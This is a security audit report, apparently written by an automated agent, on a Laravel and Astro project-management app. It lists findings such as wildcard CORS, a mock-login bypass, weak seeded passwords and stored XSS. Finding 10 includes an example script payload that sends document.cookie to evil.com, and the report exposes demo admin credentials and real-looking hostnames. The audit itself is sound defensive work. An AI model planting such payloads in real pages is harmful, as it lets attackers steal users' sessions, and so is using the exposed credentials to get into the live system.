# Security Audit Report — PM System

**Date:** July 9, 2026  
**Auditor:** Automated Security Review (Hermes Agent)  
**Scope:** Laravel 11 API (`pm-api-laravel`), Astro 4 Frontend (`pm-frontend-astro`), Dockerfiles, Nginx configs, database schema, seeders  
**Overall Risk Level: HIGH**

---

## 1. Executive Summary

The PM System is a project management application with a Laravel 11 + Sanctum API backend and an Astro static-site frontend. The application uses token-based authentication, role-based fields, and standard Laravel validation throughout. However, the audit identified **15 security findings** across 6 categories, including **2 Critical**, **6 High**, **4 Medium**, and **3 Low** severity issues.

The most severe issues are:
- **Wildcard CORS** (`allowed_origins: ['*']`) combined with token-based auth stored in `localStorage`
- **Hardcoded weak default credentials** in the seeder (`admin123`, `dev123`, etc.)
- **Mock-login fallback** in the frontend that bypasses authentication entirely when the API is unreachable
- **No RBAC enforcement** — any authenticated user can perform any CRUD operation regardless of role
- **No HTTPS** — both frontend and backend serve over plain HTTP

---

## 2. Findings

### 2.1 Critical

#### Finding 1 — Wildcard CORS Configuration
- **Severity:** Critical
- **File:** `config/cors.php` (lines 5–8)
- **Description:** The CORS configuration sets `allowed_origins`, `allowed_methods`, and `allowed_headers` all to `['*']`. This permits any website on the internet to make authenticated API requests on behalf of users. When combined with tokens stored in `localStorage`, any malicious site a user visits can read the token from `localStorage` and issue arbitrary API calls.
- **Code:**
  ```php
  'allowed_origins' => ['*'],
  'allowed_methods' => ['*'],
  'allowed_headers' => ['*'],
  ```
- **Remediation:** Restrict `allowed_origins` to the specific frontend domain only:
  ```php
  'allowed_origins' => ['http://msiqnz11cno6q97gb4gjk5rs.144.217.163.180.sslip.io'],
  'allowed_methods' => ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  'allowed_headers' => ['Content-Type', 'Authorization', 'Accept'],
  ```

#### Finding 2 — Mock-Login Bypass in Frontend
- **Severity:** Critical
- **File:** `src/pages/login.astro` (lines 63–68)
- **Description:** When the backend API is unreachable (network error), the frontend catch block creates a `mock-token` and a synthetic admin user object in `localStorage`, then redirects to the dashboard. This means any network hiccup results in a fake admin session with no actual authentication. The frontend's auth guard (`Layout.astro`) only checks for the existence of a token in `localStorage` — it never validates the token against the backend.
- **Code:**
  ```javascript
  } catch {
    // If backend unreachable, try mock login
    localStorage.setItem('pm_token', 'mock-token');
    localStorage.setItem('pm_user', JSON.stringify({ id:'1', name:'Admin', email, role:'admin' }));
    window.location.href = '/';
  }
  ```
- **Remediation:** Remove the mock-login fallback entirely. Show an error message ("Cannot connect to server") instead of creating a fake session. Additionally, implement client-side token validation by calling `/api/auth/me` on page load and redirecting to login if the token is invalid.

### 2.2 High

#### Finding 3 — Hardcoded Weak Default Credentials in Seeder
- **Severity:** High
- **File:** `database/seeders/DatabaseSeeder.php` (lines 20–73)
- **Description:** The seeder creates six users with easily guessable passwords: `admin123`, `dev123`, `qa123`, `design123`, `lead123`. These credentials are committed in the repository and are deployed to production. Anyone who reads the source code (or guesses) can authenticate with full admin privileges.
- **Remediation:** 
  - Use environment variables for all seeded passwords: `bcrypt(env('ADMIN_PASSWORD', Str::random(32)))`.
  - Force password change on first login.
  - If this is a demo/staging system, document it as such and restrict network access.

#### Finding 4 — No Role-Based Access Control (RBAC)
- **Severity:** High
- **File:** `routes/api.php` (lines 24–82), all controllers
- **Description:** The `users` table has a `role` column (`admin`, `dev`, `tester`, `designer`, `tech_lead`) but no route or controller enforces role-based authorization. Any authenticated user — regardless of role — can create, update, and delete any project, requirement, activity, product, team member, or development log. There are no policies, gates, or middleware checks for roles.
- **Remediation:**
  - Create Laravel Policies for each resource (e.g., `ProjectPolicy`, `RequirementPolicy`) with role-based checks.
  - Register a middleware like `role:admin` for destructive operations.
  - At minimum, restrict DELETE operations to admin/tech_lead roles.

#### Finding 5 — Sanctum Token Expiration Disabled
- **Severity:** High
- **File:** `config/sanctum.php` (line 53)
- **Description:** `'expiration' => null` means tokens never expire. A stolen token remains valid indefinitely until the user manually revokes it. There is also no token pruning or cleanup mechanism.
- **Remediation:** Set a reasonable expiration (e.g., 1 day for API tokens, 7 days max):
  ```php
  'expiration' => 1440, // 24 hours in minutes
  ```

#### Finding 6 — No HTTPS / TLS Encryption
- **Severity:** High
- **File:** `Dockerfile` (backend, line 163: `EXPOSE 80`), `Dockerfile` (frontend, line 15: `EXPOSE 80`), `nginx.conf` (frontend)
- **Description:** Both the API and frontend are served exclusively over HTTP. Authentication tokens, user credentials, and all data are transmitted in cleartext. Any party on the network path (ISP, MITM attacker) can intercept tokens and credentials.
- **Remediation:**
  - Terminate TLS at a reverse proxy (Nginx, Caddy, Cloudflare Tunnel).
  - Add HSTS headers.
  - Redirect all HTTP traffic to HTTPS.

#### Finding 7 — Demo Credentials Displayed on Login Page
- **Severity:** High
- **File:** `src/pages/login.astro` (line 37)
- **Description:** The login page displays the admin email and password directly in the HTML: `Demo: admin@pmsystem.com / admin123`. This is visible to any visitor and makes credential guessing trivial.
- **Code:**
  ```html
  <p class="text-center text-sm text-gray-400 mt-8">Demo: <code>admin@pmsystem.com</code> / <code>admin123</code></p>
  ```
- **Remediation:** Remove the hardcoded credential display from the login page. If a demo mode is needed, restrict it to non-production environments using environment flags.

#### Finding 8 — Hardcoded API URL in Frontend with No Environment Separation
- **Severity:** High
- **File:** `src/lib/api.ts` (line 7), `src/pages/login.astro` (line 49)
- **Description:** The backend API URL is hardcoded as a fallback default in the frontend source code: `http://zasm8vmm79eejamdbgx3zwda.144.217.163.180.sslip.io`. This exposes the internal infrastructure hostname in client-side code. The login page also hardcodes the full API URL in inline JavaScript rather than using the environment variable.
- **Code:**
  ```typescript
  const API_URL = import.meta.env.PUBLIC_API_URL || 'http://zasm8vmm79eejamdbgx3zwda.144.217.163.180.sslip.io';
  ```
  ```javascript
  const res = await fetch('http://zasm8vmm79eejamdbgx3zwda.144.217.163.180.sslip.io/api/auth/login', { ... });
  ```
- **Remediation:** Never ship with a hardcoded internal URL as fallback. Require `PUBLIC_API_URL` to be set at build time. In `login.astro`, use the same API module instead of a hardcoded fetch URL.

### 2.3 Medium

#### Finding 9 — Tokens Stored in localStorage (XSS Token Theft Risk)
- **Severity:** Medium
- **File:** `src/lib/api.ts` (lines 16, 25–26), `src/pages/login.astro` (lines 56–57), `src/layouts/Layout.astro` (line 26)
- **Description:** Sanctum bearer tokens are stored in `localStorage`, which is accessible to any JavaScript running in the page context. If an XSS vulnerability exists anywhere in the frontend, the attacker can exfiltrate the token. `httpOnly` cookies are the safer storage mechanism.
- **Remediation:** Migrate to `httpOnly` + `Secure` + `SameSite=Strict` cookies for token storage. Configure Sanctum's stateful SPA authentication (cookie-based) instead of bearer tokens. If localStorage must be used, implement Content Security Policy headers to mitigate XSS risk.

#### Finding 10 — Stored XSS via innerHTML with Unsanitized API Data
- **Severity:** Medium
- **File:** Multiple frontend pages — `reportes.astro` (lines 127, 157), `bitacora.astro` (line 143), `requerimientos.astro` (line 161), `productos.astro` (line 156), `actividades.astro` (line 159), `projects/index.astro` (line 137), `equipo.astro` (line 152), `actas.astro` (line 139), `projects/[id].astro` (lines 195, 231), `index.astro` (line 88)
- **Description:** Many pages render API response data directly into the DOM via `container.innerHTML = ...` with no HTML escaping. For example, in `reportes.astro`, project names and descriptions from the API are interpolated directly into HTML strings. If a user creates a project named `<img src=x onerror=alert(document.cookie)>`, that script executes for every user viewing the reports page. This is a stored XSS vulnerability.
- **Example:**
  ```javascript
  // reportes.astro line 150
  '<td class="py-2 font-medium">' + (p.name || '-') + '</td>' +
  // If p.name = "<script>fetch('https://evil.com?t='+document.cookie)</script>"
  ```
- **Remediation:** Use `textContent` or proper HTML escaping for all dynamic data. Create a helper:
  ```javascript
  function esc(s) { var d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
  ```
  Replace all `innerHTML` concatenations with escaped values. Better yet, use a templating approach that auto-escapes.

#### Finding 11 — Frontend Auth Guard is Client-Side Only (No Server-Side Validation)
- **Severity:** Medium
- **File:** `src/layouts/Layout.astro` (lines 21–32)
- **Description:** The auth guard is an inline `<script>` that checks `localStorage.getItem('pm_token')`. This is trivially bypassed by setting `localStorage.setItem('pm_token', 'anything')` in the browser console — even with the backend offline. Since the frontend is a static site, there is no server-side rendering gate. The mock-token fallback makes this worse.
- **Code:**
  ```javascript
  var token = localStorage.getItem('pm_token');
  if (!token) { window.location.href = '/login'; return; }
  ```
- **Remediation:** The auth guard should validate the token against the backend API on each page load (or at least periodically). Consider implementing a middleware-like pattern in Astro that checks token validity server-side or at least add a `/api/auth/me` call on app initialization.

#### Finding 12 — Docker Container Runs as Root (Frontend)
- **Severity:** Medium
- **File:** Frontend `Dockerfile`
- **Description:** The frontend Dockerfile uses the default `nginx:alpine` image without creating a non-root user. While nginx master process typically runs as root to bind port 80, no `USER` directive is specified and the container has no security hardening.
- **Remediation:** Add a `USER nginx` directive after copying files, or use nginx unprivileged image (`nginxinc/nginx-unprivileged`), or bind to port 8080 with a non-root user.

### 2.4 Low

#### Finding 13 — Missing Foreign Key Constraints on User References
- **Severity:** Low
- **File:** `database/migrations/0002_04_01_000007_create_activities_table.php` (line 21), `database/migrations/0002_05_01_000008_create_products_table.php` (line 19), `database/migrations/0002_06_01_000009_create_development_logs_table.php` (line 21), `database/migrations/0002_07_01_000010_create_team_members_table.php` (line 23)
- **Description:** Columns `asignado_a` (activities), `created_by` (products), `developer_id` (development_logs), and `dev_id` (team_members) are defined as `unsignedBigInteger` without foreign key constraints (`->foreign()->constrained()`). This means orphaned references to non-existent users can be created, and deleting a user does not cascade.
- **Remediation:** Add foreign key constraints:
  ```php
  $table->foreignId('asignado_a')->nullable()->constrained('users')->nullOnDelete();
  ```

#### Finding 14 — No Rate Limiting on Login Endpoint
- **Severity:** Low (in Laravel 11, the `throttle:api` middleware is included in the default API group, but the login route is outside of it)
- **File:** `routes/api.php` (line 19)
- **Description:** The login route (`POST /api/auth/login`) is not behind any rate-limiting middleware group. While Laravel 11 may apply the default API throttle, the explicit login route is defined outside the `['api', 'auth:sanctum']` group. This makes brute-force password attacks feasible.
- **Remediation:** Add explicit throttle middleware to the login route:
  ```php
  Route::post('/auth/login', [AuthController::class, 'login'])->middleware('throttle:5,1');
  ```

#### Finding 15 — CSPP / Security Headers Not Set
- **Severity:** Low
- **File:** Backend Dockerfile nginx config (lines 52–73), Frontend `nginx.conf`
- **Description:** Neither the frontend nor backend nginx configuration sets security headers: `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, `Referrer-Policy`. These headers help mitigate XSS, clickjacking, and MIME-type sniffing attacks.
- **Remediation:** Add security headers to both nginx configs:
  ```nginx
  add_header X-Content-Type-Options "nosniff" always;
  add_header X-Frame-Options "DENY" always;
  add_header X-XSS-Protection "1; mode=block" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'" always;
  ```

---

## 3. Additional Observations (Non-Finding Notes)

### 3.1 Input Validation — Good
All controllers use `$request->validate()` with appropriate rules (required, string, max, in, email, date, exists, url, numeric). Validation is consistently applied across store and update methods. No raw SQL queries with user input were found; `selectRaw` calls in `ReportController` use static SQL with no user interpolation. **No SQL injection risks identified.**

### 3.2 Mass Assignment — Adequate
All models define `$fillable` arrays that match their validation rules. No `$guarded = []` (allow-all) patterns were found. Mass assignment protection is properly implemented.

### 3.3 Model Serialization — Good
The `User` model hides `password` and `remember_token` in the `$hidden` array. Passwords are cast as `hashed`. This prevents accidental password leakage in API responses.

### 3.4 Route Protection — Good
All API routes except `/health` and `/auth/login` are protected by the `auth:sanctum` middleware. The logout and me routes have individual middleware. No unauthenticated routes expose sensitive data.

### 3.5 Debug Mode — Properly Disabled
The Dockerfile entrypoint sets `APP_DEBUG=false` by default (line 112), and the production PHP ini is used (`php.ini-production`). This is correctly configured.

### 3.6 Storage/Logs — Not Publicly Exposed
The nginx config in the backend Dockerfile includes a rule to deny access to `.ht` files (line 69–71). The root is set to `/var/www/html/public`, which is the standard Laravel public directory and excludes `storage/logs` from direct access. However, the `ReportController::exportCsv` stores reports in the `public` disk under `reports/`, which **is** publicly accessible — this could leak project data if the filename is guessable (format: `project_{id}_report.csv`).

### 3.7 Database Indexing — Good
A dedicated migration (`0003_01_01_000011_add_indexes.php`) adds indexes on frequently queried columns (status, priority, fecha_limite, estado, role, estado_firma, fecha_sesion, tipo_accion, fecha_registro, type). Indexing is comprehensive.

### 3.8 Type Mismatch — fecha_firma_acta
The migration for `requirement_actas` defines `fecha_firma_acta` as `date` (line 22), but the model casts it as `datetime` (line 31 of `RequirementActa.php`). This inconsistency could cause unexpected behavior when reading/writing timestamps.

---

## 4. Recommendations (Prioritized)

| Priority | Finding | Action |
|----------|---------|--------|
| **P0** | #1 | Lock down CORS to the specific frontend origin |
| **P0** | #2 | Remove mock-login fallback; implement real token validation |
| **P0** | #3 | Replace hardcoded seeder passwords with env vars; rotate existing passwords |
| **P0** | #4 | Implement role-based access control with Laravel Policies |
| **P1** | #5 | Set Sanctum token expiration (e.g., 24h) |
| **P1** | #6 | Enable HTTPS with a reverse proxy; add HSTS |
| **P1** | #7 | Remove displayed credentials from login page |
| **P1** | #8 | Remove hardcoded API URL fallback; use env var only |
| **P2** | #9 | Migrate from localStorage to httpOnly cookies for token storage |
| **P2** | #10 | Sanitize all innerHTML with proper HTML escaping |
| **P2** | #11 | Add server-side token validation in the frontend auth flow |
| **P2** | #12 | Run container as non-root user |
| **P3** | #13 | Add foreign key constraints on user reference columns |
| **P3** | #14 | Add explicit rate limiting on login route |
| **P3** | #15 | Add security headers to nginx configs |

---

## 5. Summary

The PM System has a solid foundation with good input validation, proper mass assignment protection, and correct route authorization middleware. However, the wildcard CORS policy, mock-login bypass, weak default credentials, and absence of RBAC enforcement are critical security gaps that must be addressed before the system can be considered production-ready. The frontend's reliance on `localStorage` for tokens and extensive use of unescaped `innerHTML` create additional XSS and token-theft risks that compound the CORS issue.

**Risk Rating: HIGH** — The combination of wildcard CORS + localStorage tokens + XSS via innerHTML creates a chained attack path where a malicious website could steal authentication tokens and impersonate any user.

---

*End of Report*
